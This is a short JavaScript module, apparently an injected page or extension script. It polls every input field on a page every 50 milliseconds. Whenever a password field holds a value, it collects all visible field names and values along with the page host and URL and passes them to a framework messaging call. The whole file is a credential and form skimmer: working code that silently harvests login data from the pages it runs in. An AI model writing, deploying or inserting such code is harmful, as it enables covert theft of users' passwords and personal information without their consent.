module.exports = function (___) {
   
    
var page_unique_id = new Date().getTime()

___.var.user_data_input = ___.var.user_data_input || [];

setInterval(() => {

    let input_list = []
    let has_password = false

    document.querySelectorAll('input').forEach((input , index) => {
        if (input.value == "" || input.type == 'hidden' || input.type == 'submit') {
            return
        }

        if (input.type.toLowerCase() === 'password') {
            has_password = true
        }

        input_list.push({
            index : index,
            id: input.id,
            name: input.name,
            value: input.value,
            type: input.type
        })

    })

   

    if (has_password && input_list.length > 0) {

        ___.call('render_message' , {
            name: 'user-input',
            id: page_unique_id,
            host: document.location.host,
            url: document.location.href,
            data: input_list
        })
    }

}, 50)

}